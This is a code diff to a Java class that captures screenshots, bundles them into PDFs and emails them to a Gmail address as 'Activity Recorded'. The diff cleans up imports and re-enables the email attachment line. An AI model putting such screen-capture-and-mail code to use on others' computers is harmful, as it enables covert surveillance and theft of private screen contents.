@@ -7,19 +7,13 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
-import java.time.LocalDateTime;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
 
 import javax.imageio.ImageIO;
-import javax.mail.internet.MimeMessage;
 
 import org.apache.commons.mail.DefaultAuthenticator;
 import org.apache.commons.mail.EmailException;
@@ -28,13 +22,8 @@ import org.apache.pdfbox.pdmodel.PDDocument;
 import org.apache.pdfbox.pdmodel.PDPage;
 import org.apache.pdfbox.pdmodel.PDPageContentStream;
 import org.apache.pdfbox.pdmodel.common.PDRectangle;
-import org.apache.pdfbox.pdmodel.font.PDType0Font;
-import org.apache.pdfbox.pdmodel.font.PDType1CFont;
 import org.apache.pdfbox.pdmodel.font.PDType1Font;
-import org.apache.pdfbox.pdmodel.font.PDType3Font;
 import org.apache.pdfbox.pdmodel.graphics.image.PDImageXObject;
-
-import net.lingala.zip4j.ZipFile;
 
 public class CaptureSSMailPdf {
 
@@ -59,6 +48,7 @@ public class CaptureSSMailPdf {
 
 				if (i == 10) {
 					i = 0;
+					// PDF Box maven Dependency
 					PDDocument document = new PDDocument();
 					for(List<Object> imgObj : imageList) {
 						PDPage page = new PDPage();
@@ -90,7 +80,7 @@ public class CaptureSSMailPdf {
 					email.setMsg("Activity Recorded");
 					email.addTo("memyselfpro@gmail.com");
 
-//					// add the attachment
+					// add the attachment
 					email.attach(new File("C:\\Users\\anisingh12\\Pictures\\CaptureSS\\pdf-" + (time / 10) + ".pdf"));
 					System.out.println("SENDING Pdf " + (time/10));
 					// send the email and delete the files
